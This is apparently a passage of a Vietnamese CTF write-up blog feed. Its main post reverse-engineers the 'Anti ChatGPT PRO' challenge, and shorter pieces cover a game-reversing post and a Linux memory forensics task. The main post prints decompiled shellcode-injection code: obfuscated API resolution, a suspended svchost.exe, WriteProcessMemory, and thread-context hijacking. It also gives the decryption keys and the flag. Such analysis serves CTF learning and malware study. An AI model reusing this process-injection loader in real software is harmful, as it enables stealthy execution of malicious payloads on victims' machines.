&lt;p&gt;hoặc LONG.&lt;/p&gt;
&lt;p&gt;Nếu kết quả “push/refund” (draw): hoàn tiền →&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[PUSH] O=... | refund ... | bank=...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Trigger điều kiện đặc biệt (FLAG)&lt;/p&gt;
&lt;p&gt;Nếu bankroll vượt 99,999,999 (100 triệu) và byte_14020EA48 == 0:&lt;/p&gt;
&lt;p&gt;Set byte_14020EA48 = 1.&lt;/p&gt;
&lt;p&gt;In [INFO] Target reached!.&lt;/p&gt;
&lt;p&gt;Gọi hàm sub_1400037B0 để giải mã chuỗi Base64 → config/FLAG.&lt;/p&gt;
&lt;p&gt;Nếu thành công: in [FLAG] &amp;lt;plaintext&amp;gt;.&lt;/p&gt;
&lt;p&gt;Nếu fail: in [WARN] Decrypt failed.&lt;/p&gt;
&lt;p&gt;Cleanup&lt;/p&gt;
&lt;p&gt;Free các buffer tạm (nhiều lần gọi j_j_free_2_4).&lt;/p&gt;
&lt;p&gt;Nếu bankroll ≤ 0 → set quit flag (*(_BYTE**)(a1+56)=1, &lt;em&gt;(_BYTE&lt;/em&gt;)(a1+64)=...).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;PS: Cảm ơn mọi người đã đọc!!!&lt;/p&gt;
&lt;/blockquote&gt;
</content:encoded></item><item><title>Anti ChatGPT PRO (PTITCTF)</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/anti-chatgpt/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/anti-chatgpt/</guid><pubDate>Sun, 21 Sep 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Anti ChatGPT PRO (PTITCTF)&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Anti ChatGPT Pro ⭐️🧠
500
hard reverse noGPT
0 (0% liked)  1
Chào mừng trở lại, Nhà thám hiểm.
Bạn đã vượt qua mê cung, nhưng phía trước không phải là lối thoát, mà là một căn phòng phủ kín gương.
Mọi thứ bạn thấy đều là phản chiếu – nửa thật, nửa giả, trộn lẫn trong trò chơi của ảo giác.
Những manh mối có thể xuất hiện ở khắp nơi, nhưng cũng có thể chỉ là bẫy để đánh lừa trực giác của bạn.
Ở đây, không chỉ đôi mắt bị thử thách, mà cả niềm tin vào lý trí của chính bạn.
Bạn có dám phá vỡ những chiếc gương để tìm ra sự thật, hay sẽ bị giam cầm trong mê cung của ảo ảnh?
pass: ptitctf2025&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Bắt đầu với một mô tả khá chill chill :))&lt;/p&gt;
&lt;h2&gt;Start&lt;/h2&gt;
&lt;p&gt;Tại entry (Hàm start) Có gọi một số hàm lạ
&lt;img src=&quot;https://hackmd.io/_uploads/HkvkfCAigx.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/r1LaW0Asex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Ta thấy logic khá đơn giản:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Mở socket với IP &lt;strong&gt;127.0.0.1:1337&lt;/strong&gt; Send gửi data đi&lt;/li&gt;
&lt;li&gt;Check Flag (nhận data gửi về và kiểm tra nếu chuỗi là &quot;True&quot; thì print ra Amazing good job ngược lại print ra &quot;Wrong&quot;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Sub_1400248E0 (hàm khởi tạo)&lt;/h2&gt;
&lt;p&gt;Sau khi check các hàm có một số hàm bị lỗi stack frame too long khiến IDA không thể compiled được nhưng ở hàm &lt;strong&gt;sub_1400248E0&lt;/strong&gt; dương như là một hàm khởi tạo cho runtime chứa:
&lt;img src=&quot;https://hackmd.io/_uploads/r1sSXRRjxe.png&quot; alt=&quot;image&quot; /&gt;
&lt;strong&gt;&amp;amp;unk_14002F030&lt;/strong&gt; trỏ tới duy nhất một offset
&lt;img src=&quot;https://hackmd.io/_uploads/BJ_F70Rolx.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/rJQnmCAogl.png&quot; alt=&quot;image&quot; /&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/SknmcARjel.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&amp;amp;unk_14002F030 -&amp;gt; sub_140001900 -&amp;gt;  sub_140001740&lt;/strong&gt; Hàm này đáng chú ý vì nằm ngoài luồng logic kiểm tra flag, đồng thời chứa nhiều đoạn mã bất thường.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note : Ban đầu mình đã reverse trước và rename lại tên hàm&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;Xor_DEADBEEF&lt;/h2&gt;
&lt;p&gt;Hàm &lt;strong&gt;xor_DEADBEEF&lt;/strong&gt; là một hàm xor với key hardcode là &lt;strong&gt;b&quot;\xDE\xAD\xBE\xEF&quot;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;unsigned __int64 __fastcall sub_140023FA0(__int64 a1, unsigned __int64 a2, __int64 a3)
{
  unsigned __int64 result; // rax
  unsigned __int64 i; // [rsp+0h] [rbp-28h]
  _BYTE v5[4]; // [rsp+Ch] [rbp-1Ch]
  __int64 v6; // [rsp+10h] [rbp-18h]
  unsigned __int64 v7; // [rsp+18h] [rbp-10h]
  __int64 v8; // [rsp+20h] [rbp-8h]

  v8 = a1;
  v7 = a2;
  v6 = a3;
  v5[0] = 0xDE;
  v5[1] = 0xAD;
  v5[2] = 0xBE;
  v5[3] = 0xEF;
  for ( i = 0LL; ; ++i )
  {
    result = i;
    if ( i &amp;gt;= v7 )
      break;
    *(_BYTE *)(v6 + i) = v5[i &amp;amp; 3] ^ *(_BYTE *)(v8 + i);
  }
  return result;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Tiến hành giải mã chuỗi bytes bằng hàm &lt;strong&gt;Xor_DEADBEEF&lt;/strong&gt;
&lt;img src=&quot;https://hackmd.io/_uploads/HJPoPAAoxl.png&quot; alt=&quot;image&quot; /&gt;
Theo tài liệu &lt;a href=&quot;https://learn.microsoft.com/en-us/cpp/c-runtime-library/reference/beginthread-beginthreadex?view=msvc-170&quot;&gt;Microsoft&lt;/a&gt;, API _beginthreadex được sử dụng để tạo một thread mới tại một routine thực thi, và trong trường hợp này hàm GetProcAddress được dùng để lấy địa chỉ từ msvcrt.dll.
Hàm sub_140024100 đóng vai trò là start address được truyền vào _beginthreadex.&lt;/p&gt;
&lt;h2&gt;sub_140024100&lt;/h2&gt;
&lt;p&gt;Qua phân tích, có thể thấy hàm sub_140024100 thực chất hoạt động như một shellcode loader.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;__int64 __fastcall sub_140024100(__int64 a1)
{
  _CONTEXT Context; // [rsp+50h] [rbp-798h] BYREF
  HANDLE hThread; // [rsp+528h] [rbp-2C0h]
  DWORD dwThreadId; // [rsp+530h] [rbp-2B8h]
  DWORD dwProcessId; // [rsp+534h] [rbp-2B4h]
  char v6[8]; // [rsp+538h] [rbp-2B0h] BYREF
  unsigned __int64 v7; // [rsp+540h] [rbp-2A8h] BYREF
  LPCVOID lpBuffer; // [rsp+548h] [rbp-2A0h]
  LPVOID lpBaseAddress; // [rsp+550h] [rbp-298h]
  __int64 v10; // [rsp+558h] [rbp-290h]
  unsigned int v11; // [rsp+560h] [rbp-288h]
  _BYTE ResumeThread[13]; // [rsp+566h] [rbp-282h] BYREF
  unsigned __int64 v13; // [rsp+573h] [rbp-275h] BYREF
  int v14; // [rsp+57Bh] [rbp-26Dh]
  char v15; // [rsp+57Fh] [rbp-269h]
  __int64 v16; // [rsp+580h] [rbp-268h]
  unsigned int v17; // [rsp+58Ch] [rbp-25Ch]
  _BYTE SetThreadContentA[32]; // [rsp+590h] [rbp-258h] BYREF
  _QWORD v19[2]; // [rsp+5B0h] [rbp-238h] BYREF
  char v20; // [rsp+5C0h] [rbp-228h]
  __int64 v21; // [rsp+5D0h] [rbp-218h]
  unsigned int v22; // [rsp+5DCh] [rbp-20Ch]
  _BYTE GetThreadContentA[32]; // [rsp+5E0h] [rbp-208h] BYREF
  _QWORD v24[2]; // [rsp+600h] [rbp-1E8h] BYREF
  char v25; // [rsp+610h] [rbp-1D8h]
  __int64 v26; // [rsp+618h] [rbp-1D0h]
  unsigned int v27; // [rsp+624h] [rbp-1C4h]
  _BYTE OpenThread[11]; // [rsp+62Ah] [rbp-1BEh] BYREF
  unsigned __int64 v29; // [rsp+635h] [rbp-1B3h] BYREF
  __int16 v30; // [rsp+63Dh] [rbp-1ABh]
  char v31; // [rsp+63Fh] [rbp-1A9h]
  __int64 v32; // [rsp+640h] [rbp-1A8h]
  unsigned int v33; // [rsp+64Ch] [rbp-19Ch]
  _BYTE WriteProcessMemory[32]; // [rsp+650h] [rbp-198h] BYREF
  _QWORD v35[2]; // [rsp+670h] [rbp-178h] BYREF
  __int16 v36; // [rsp+680h] [rbp-168h]
  char v37; // [rsp+682h] [rbp-166h]
  __int64 v38; // [rsp+688h] [rbp-160h]
  unsigned int v39; // [rsp+694h] [rbp-154h]
  _BYTE VirtualAlloc[15]; // [rsp+69Ah] [rbp-14Eh] BYREF
  unsigned __int64 v41; // [rsp+6A9h] [rbp-13Fh] BYREF
  int v42; // [rsp+6B1h] [rbp-137h]
  __int16 v43; // [rsp+6B5h] [rbp-133h]
  char v44; // [rsp+6B7h] [rbp-131h]
  __int64 v45; // [rsp+6B8h] [rbp-130h]
  unsigned int v46; // [rsp+6C4h] [rbp-124h]
  _BYTE CreateProcessA[15]; // [rsp+6CAh] [rbp-11Eh] BYREF
  unsigned __int64 v48; // [rsp+6D9h] [rbp-10Fh] BYREF
  int v49; // [rsp+6E1h] [rbp-107h]
  __int16 v50; // [rsp+6E5h] [rbp-103h]
  char v51; // [rsp+6E7h] [rbp-101h]
  __int64 v52; // [rsp+6E8h] [rbp-100h]
  unsigned int v53; // [rsp+6F0h] [rbp-F8h]
  _BYTE kernel32[13]; // [rsp+6F6h] [rbp-F2h] BYREF
  unsigned __int64 v55; // [rsp+703h] [rbp-E5h] BYREF
  int v56; // [rsp+70Bh] [rbp-DDh]
  char v57; // [rsp+70Fh] [rbp-D9h]
  CHAR CommandLine[32]; // [rsp+710h] [rbp-D8h] BYREF
  _QWORD v59[5]; // [rsp+730h] [rbp-B8h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+758h] [rbp-90h] BYREF
  struct _STARTUPINFOA StartupInfo; // [rsp+770h] [rbp-78h] BYREF
  __int64 v62; // [rsp+7D8h] [rbp-10h]
  unsigned int v63; // [rsp+7E4h] [rbp-4h]

  v62 = a1;
  memset(&amp;amp;StartupInfo, 0, sizeof(StartupInfo));
  StartupInfo.cb = 104;
  memset(&amp;amp;ProcessInformation, 0, sizeof(ProcessInformation));
  v59[0] = 0x80DAC3B7B8E2979DuLL;
  v59[1] = 0x8ACADEA7BCE2DEA9uLL;
  v59[2] = 0x87DDDBADB38C9EB3uLL;
  v59[3] = 0xEFDBD5BBC1CADEB1uLL;
  xor_DEADBEEF((__int64)v59, 0x20uLL, (__int64)CommandLine);// C:\Windows\System32\svchost.exe
  v55 = 0xDD8DC1BB81CCC8B5uLL;
  v56 = 0x83D2C9F0;
  v57 = 0xDE;
  xor_DEADBEEF((__int64)&amp;amp;v55, 0xDuLL, (__int64)kernel32);// kernel32
  v53 = hash(kernel32);
  v52 = PEB_ldr(v53);
  v48 = 0x9DEEC8AA8EDBDF9DuLL;
  v49 = 0x9CDBCEB1;
  v50 = 0xECAD;
  v51 = 0xBE;
  xor_DEADBEEF((__int64)&amp;amp;v48, 0xFuLL, (__int64)CreateProcessA);// CreateProcess
  v46 = hash(CreateProcessA);
  v45 = parser_returnAddrAPI(v52, v46);
  v41 = 0xAED2CCAB9BCCC488uLL;
  v42 = 0x8CD1C1B2;
  v43 = 0xD59B;
  v44 = 0xBE;
  xor_DEADBEEF((__int64)&amp;amp;v41, 0xFuLL, (__int64)VirtualAlloc);// VirtualAlloc
  v39 = hash(VirtualAlloc);
  v38 = parser_returnAddrAPI(v52, v39);
  v35[0] = 0x80CCFDBB9BD7DF89uLL;
  v35[1] = 0x80D3C8939CCDC8BDuLL;
  v36 = -11092;
  v37 = -66;
  xor_DEADBEEF((__int64)v35, 0x13uLL, (__int64)WriteProcessMemory);// WriteProcessMemory
  v33 = hash(WriteProcessMemory);
  v32 = parser_returnAddrAPI(v52, v33);
  v29 = 0x8ACCC58A81DBDD91uLL;
  v30 = 0xC9BF;
  v31 = 0xBE;
  xor_DEADBEEF((__int64)&amp;amp;v29, 0xBuLL, (__int64)OpenThread);// OpenThread
  v27 = hash(OpenThread);
  v26 = parser_returnAddrAPI(v52, v27);
  v24[0] = 0x8EDBDFB6BBCAC899uLL;
  v24[1] = 0x9BC6C8AA81D1EEBAuLL;
  v25 = -34;
  xor_DEADBEEF((__int64)v24, 0x11uLL, (__int64)GetThreadContentA);// GetThreadContentA
  v22 = hash(GetThreadContentA);
  v21 = parser_returnAddrAPI(v52, v22);
  v19[0] = 0x8EDBDFB6BBCAC88DuLL;
  v19[1] = 0x9BC6C8AA81D1EEBAuLL;
  v20 = -34;
  xor_DEADBEEF((__int64)v19, 0x11uLL, (__int64)SetThreadContentA);// SetThreadContentA
  v17 = hash(SetThreadContentA);
  v16 = parser_returnAddrAPI(v52, v17);
  v13 = 0x87EAC8B39ACDC88CuLL;
  v14 = 0x8BDFC8AC;
  v15 = 0xDE;
  xor_DEADBEEF((__int64)&amp;amp;v13, 0xDuLL, (__int64)ResumeThread);// ResumeThread
  v11 = hash(ResumeThread);
  v10 = parser_returnAddrAPI(v52, v11);
  if ( ::CreateProcessA(0LL, CommandLine, 0LL, 0LL, 1, 4u, 0LL, 0LL, &amp;amp;StartupInfo, &amp;amp;ProcessInformation) )
  {
    lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, 0LL, (unsigned int)Size, 0x3000u, 0x40u);
    lpBuffer = malloc((unsigned int)Size);
    if ( lpBuffer )
    {
      memcpy((void *)lpBuffer, byte_140030FB0, (unsigned int)Size);
      v7 = 0xEFEAFD99BBFFE59DuLL;
      xor_DEADBEEF((__int64)&amp;amp;v7, 8uLL, (__int64)v6);
      xor((__int64)lpBuffer, Size, v6);
      ::WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, lpBuffer, (unsigned int)Size, 0LL);
      free((void *)lpBuffer);
    }
    dwProcessId = ProcessInformation.dwProcessId;
    dwThreadId = sub_140001910(ProcessInformation.dwProcessId);
    hThread = ::OpenThread(0x1FFFFFu, 0, dwThreadId);
    memset(&amp;amp;Context, 0, sizeof(Context));
    Context.ContextFlags = 1048587;
    GetThreadContext(hThread, &amp;amp;Context);
    Context.Rip = (DWORD64)lpBaseAddress + 2432;
    SetThreadContext(hThread, &amp;amp;Context);
    ::ResumeThread(hThread);
  }
  else
  {
    return (unsigned int)-1;
  }
  return v63;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;Hành vi chính của hàm bao gồm việc chuẩn bị target process và resolve API (thông qua kỹ thuật obfuscation + API hashing).&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Giải mã chuỗi lệnh &quot;C:\Windows\System32\svchost.exe&quot; bằng xor_DEADBEEF → lưu vào CommandLine.&lt;/li&gt;
&lt;li&gt;Giải mã chuỗi &quot;kernel32&quot; → băm (hash) → PEB_ldr(hash) duyệt PEB-&amp;gt;Ldr để lấy base kernel32.&lt;/li&gt;
&lt;li&gt;Lần lượt giải mã tên API và lấy địa chỉ qua export-table + hàm băm:&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;CreateProcessA, VirtualAlloc(Ex), WriteProcessMemory, OpenThread,

GetThreadContext/SetThreadContext 

ResumeThread.
(Tất cả tên API đều đang bị XOR-encode rồi hash-lookup thay vì dùng IAT.)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;Tạo tiến trình con ở trạng thái treo&lt;/li&gt;
&lt;li&gt;CreateProcessA(NULL, &quot;…\svchost.exe&quot;, …, CREATE_SUSPENDED) → nhận ProcessInformation (PID/TID, handle process/thread).&lt;/li&gt;
&lt;li&gt;Cấp phát &amp;amp; giải mã payload rồi nhét vào tiến trình con&lt;/li&gt;
&lt;li&gt;VirtualAllocEx(process, …, Size, MEM_COMMIT|RESERVE, PAGE_EXECUTE_READWRITE) → lpBaseAddress.&lt;/li&gt;
&lt;li&gt;Cấp buffer tạm (malloc), copy payload thô từ byte_140030FB0 (kích thước Size).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Giải mã payload:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Giải mã 8-byte key từ hằng 0xEFEAFD99BBFFE59D → v6[8].&lt;/li&gt;
&lt;li&gt;Gọi xor((__int64)lpBuffer, Size, v6) để XOR toàn bộ payload bằng key 8B (lặp theo vòng).&lt;/li&gt;
&lt;li&gt;WriteProcessMemory(process, lpBaseAddress, lpBuffer, Size, NULL) rồi free.&lt;/li&gt;
&lt;li&gt;Đổi entrypoint thread để nhảy vào payload&lt;/li&gt;
&lt;li&gt;Lấy TID của tiến trình con (sub_140001910(PID)), OpenThread(THREAD_ALL_ACCESS, …, TID).&lt;/li&gt;
&lt;li&gt;GetThreadContext(hThread, &amp;amp;Context), sửa Context.Rip = lpBaseAddress + 2432 (offset 0x980),
rồi SetThreadContext(hThread, &amp;amp;Context). (Tức entrypoint của thread sẽ “đâm” thẳng vào shellcode đã viết.)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Chạy payload&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ResumeThread(hThread) → thread tiếp tục thực thi từ RIP mới (payload).&lt;/li&gt;
&lt;li&gt;Trả về v63 (biến trạng thái/garbage), thất bại thì trả -1.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;NOTE:
Tất cả string/API name đều bị che bằng XOR (xor_DEADBEEF) rồi so khớp bằng hàm băm hash().
PEB_parser/parser_returnAddrAPI là PEB-&amp;gt;ldr + export-resolver từ PEB để IAT.
Key &lt;strong&gt;XOR 8 byte&lt;/strong&gt; dùng để giải mã &lt;strong&gt;payload&lt;/strong&gt; trước khi &lt;strong&gt;WriteProcessMemory&lt;/strong&gt;.
&lt;strong&gt;Offset +2432&lt;/strong&gt; là entry bên trong khối payload (tránh nhảy từ đầu).
Tóm lại: hàm này thực hiện process injection kiểu create-remote-thread-hijack trên svchost.exe bị treo: giải mã tên API và payload, ghi shellcode vào tiến trình con, chỉnh RIP của thread chính đến shellcode, rồi resume để chạy&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Tính toán key
&lt;img src=&quot;https://hackmd.io/_uploads/BJfbA00sex.png&quot; alt=&quot;image&quot; /&gt;
Từ đó, ta tính được key giải mã là &lt;strong&gt;b&quot;CHATGPT&quot;&lt;/strong&gt;, dùng để dump và giải mã shellcode.
&lt;img src=&quot;https://hackmd.io/_uploads/HyBN0CAjgx.png&quot; alt=&quot;image&quot; /&gt;
Tôi nạp phần shellcode vào BinaryNinja và thiết lập base address là 0x1B000.
Khi thực thi, hàm sub_140024100 đặt con trỏ lệnh (RIP) đến địa chỉ lpBaseAddress + 2432. Với cấu hình base address = 0x1B000, địa chỉ này trỏ đến offset 0x1B980, chính là vị trí bắt đầu của main code để phân tích.
&lt;img src=&quot;https://hackmd.io/_uploads/HkXhkkkngg.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Với các logic code quen thuộc đã được sử dụng ở file ban đầu giúp ta dễ dàng phân tích hơn vẫn sử dụng lại các hàm như Xor_DEADBEEF và PEB_ldr, parser_returnAddrAPI&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Note: trong hình trên tôi đã rename lại tất cả biến với việc xor_deadbeef với các byteraw&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Đầu tiên, shellcode load hai thư viện ws2_32.dll và kernel32.dll để resolve các API cần thiết.
Mở socket với các API như (WSASTARTUP, socket, inet_addr, htons, bind, listen, recv, send)
&lt;img src=&quot;https://hackmd.io/_uploads/SJZwW1khll.png&quot; alt=&quot;image&quot; /&gt;
Tiếp theo, shellcode load msvcrt.dll, tạo key RC4 thông qua sub_1b520, và dùng nó để giải mã payload đã được hardcode.
&lt;img src=&quot;https://hackmd.io/_uploads/HkF1fJJhll.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tóm tắt lại tiến trình con svchost.exe:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Resolve DLL/API bằng PEB + tên bị XOR&lt;/li&gt;
&lt;li&gt;Giải mã (Xor_DEADBEEF) các chuỗi: &quot;kernel32&quot;, &quot;WS2_32.dll&quot;, rồi băm (hash) và tra qua PEB_ldr(...) + parser_returnAddrAPI(...) để lấy địa chỉ các API mạng:
&lt;strong&gt;WSAStartup, socket, setsockopt, inet_addr, htons, bind, listen, accept, recv, send, closesocket, WSACleanup.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Đây là kỹ thuật né IAT (API hashing + PEB walker).&lt;/li&gt;
&lt;li&gt;Khởi tạo Winsock + tạo socket bound về localhost&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;WSAStartup()&lt;/strong&gt;; tạo SOCKET qua socket().&lt;/li&gt;
&lt;li&gt;Có gọi setsockopt() với optlen=4 (biến output = 4) — khả năng đặt timeout/SO_RCVTIMEO hoặc reuse addr (không thấy cụ thể option id trong snippet, nhưng pattern giống setsockopt(s, SOL_SOCKET, X, &amp;amp;val, 4)).&lt;/li&gt;
&lt;li&gt;Dùng inet_addr(&quot;127.0.0.1&quot;) và htons(...) để điền sockaddr_in (family = AF_INET = 2, IP loopback).&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Lắng nghe và nhận kết nối&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;bind()&lt;/strong&gt; rồi listen(); nếu cả hai đều OK (khác 0xFFFFFFFF), nó lặp accept() cho đến khi nhận được socket hợp lệ (khác INVALID_SOCKET).
Nhận dữ liệu và xử lý “gói” RC4&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;recv()&lt;/strong&gt; vào buffer 0x400. Nếu nhận &amp;gt; 0, Nó từ tiến trình cha đã mở socket và gửi qua cổng 1337:&lt;/li&gt;
&lt;li&gt;Giải mã tên &quot;msvcrt.dll&quot; và hàm &quot;strcpy&quot;&lt;/li&gt;
&lt;li&gt;Có một “input blob” 0x1E bytes (3 qword + 1 word):&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Gọi &lt;strong&gt;sub_1b520(&quot;546423423634&quot;)&lt;/strong&gt; để tạo key RC4:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hàm đó giải mã tên &quot;kernel32&quot;, &quot;msvcrt.dll&quot;, &quot;LoadLibrary&quot;, &quot;sscanf_s&quot; rồi dùng sscanf_s/parser để biến chuỗi hexa &quot;546423423634&quot; thành dãy byte, trả về độ dài/2 (nếu số ký tự hex chẵn) hoặc -1 nếu lẻ. → Kết luận: key RC4 = bytes của chuỗi hex &quot;54 64 23 42 36 34&quot;.&lt;/li&gt;
&lt;li&gt;Gọi RC4_decryption(key, keyLen, input, input_len, output) để giải mã blob nói trên vào buffer output (đã zero).&lt;/li&gt;
&lt;li&gt;Sau đó shellcode sẽ lấy dữ liệu được nhận và so sánh với output decryption và trả kết quả ‘Wrong’ hoặc ‘True&apos;.&lt;/li&gt;
&lt;li&gt;Sau đó nó sẽ gửi lại Tiến trình cha là &quot;Wrong&quot; hay &quot;True&quot;
&lt;strong&gt;-&amp;gt; Hardcode buffer sau khi decryption RC4 là flag dùng để kiểm tra input từ tiến trình cha.&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Decryption blob (0x1e)&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/Sko87J1ngl.png&quot; alt=&quot;code&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Output:
Cipher (hex): 7a5c600ca5d7e7480316ed0e5bb2d9bf01eec9bdbcc1b94c0dc67fb3a1eb
Key (hex)   : 546423423634  / ASCII: Td#B64
Plain (hex) : 505449544354467b346e74695f636834745f6750745f5072305f6b6b6b7d
Plain (ascii): PTITCTF{4nti_ch4t_gPt_Pr0_kkk}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://hackmd.io/_uploads/rkfyTQW3xl.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Tóm tắt toàn bộ chương trình:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Tiến trình cha khởi tạo tiến trình con svchost.exe (chứa logic check flag input)&lt;/li&gt;
&lt;li&gt;Mở connection 127.0.0.1:1337 để tiến trình cha và tiến trình con giao tiếp với nhau gửi input và trả kết quả
&lt;strong&gt;-&amp;gt; FLAG: PTITCTF{4nti_ch4t_gPt_Pr0_kkk}&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>F-Forensisc</title><link>https://bruning-frighting.github.io/KAiZ3nThong/posts/f-forensisc/</link><guid isPermaLink="true">https://bruning-frighting.github.io/KAiZ3nThong/posts/f-forensisc/</guid><description>How code blocks look in Markdown using Expressive Code.</description><pubDate>Fri, 01 Aug 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;F - Forensics&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;Decriptions:
https://drive.google.com/file/d/1aQ4lWR_vrqWwPLwf6gJj2FDFbbfyGNHB/view?usp=drive_link
The chall name says it all !
https://www.deadsec.xyz/instances/f-forensics
&lt;img src=&quot;https://hackmd.io/_uploads/B1bAkVIDex.png&quot; alt=&quot;image&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Trong team của tôi đã không có thời gian để solve challenge này vì ngày hôm sau chúng tôi có một cuộc thi CTF onsite supper guessy :))
Nên bây giờ tôi sẽ làm lại&lt;/p&gt;
&lt;p&gt;Đập vào mắt tôi là một file linux memory , oh shit i hate it, Cá nhân tôi thì không được ổn trong việc linux memory lắm :v&lt;/p&gt;
&lt;p&gt;Việc đầu tiên nên làm là check kernel của file dump đó&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;Linux version 5.15.0-138-generic (buildd@lcy02-amd64-014) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #148-Ubuntu SMP Fri Mar 14 19:05:48 UTC 2025 (Ubuntu 5.15.0-138.148-generic 5.15.178)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Đây là kernel version của file tôi đã thử build profiles của volatility2 nhưng tôi không hiểu tại sao lại không dùng được vì thói quen tôi vẫn là volatility2 hơn là volatility3 nếu ai build được profile này trên vol2 có thể share với tôi với&lt;/p&gt;
&lt;h2&gt;Build profile dùng cho volatility3&lt;/h2&gt;
&lt;p&gt;Đây là một bài &lt;a href=&quot;https://www.hackthebox.com/blog/how-to-create-linux-symbol-tables-volatility&quot;&gt;blog&lt;/a&gt; rất chi tiết về symbols và kernel trong volatility3 linux và cách build&lt;/p&gt;
&lt;p&gt;cài đặt dwarf2json&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/downloads/CTFchall/hacktheon/mem]
└─$ python ubuntu_symbols_finder.py &quot;Linux version 5.15.0-138-generic (buildd@lcy02-amd64-014) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #148-Ubuntu SMP Fri Mar 14 19:05:48 UTC 2025 (Ubuntu 5.15.0-138.148-generic 5.15.178)&quot;
Debug symbols should be available at http://launchpadlibrarian.net/781907576/linux-image-unsigned-5.15.0-138-generic-dbgsym_5.15.0-138.148_amd64.ddeb. Here is a typical procedure to create the ISF :

wget http://launchpadlibrarian.net/781907576/linux-image-unsigned-5.15.0-138-generic-dbgsym_5.15.0-138.148_amd64.ddeb
dpkg-deb -x linux-image-unsigned-5.15.0-138-generic-dbgsym_5.15.0-138.148_amd64.ddeb linux-image-unsigned-5.15.0-138-generic-dbgsym_5.15.0-138.148_amd64/
dwarf2json linux --elf linux-image-unsigned-5.15.0-138-generic-dbgsym_5.15.0-138.148_amd64/usr/lib/debug/boot/vmlinux-5.15.0-138-generic | xz &amp;gt; linux-image-unsigned-5.15.0-138-generic-dbgsym_5.15.0-138.148_amd64.json.xz
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Sau khi build xong mọi thứ có vẻ ổn trừ việc sử dụng các plugins liên quan đến dump files như &lt;strong&gt;linux.RecoverFs&lt;/strong&gt; và &lt;strong&gt;linux.pslist --dump&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;vài câu đầu khá dễ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(thong㉿MSI)-[/mnt/c/users/tttho/downloads/CTFchall/hacktheon/mem]
└─$ nc nc.deadsec.quest 31722

Answer all the questions and you&apos;ll get the flag. Good Luck !! :3

We&apos;ll start with a little sanity check, what&apos;s the sha256 hash of the file ?
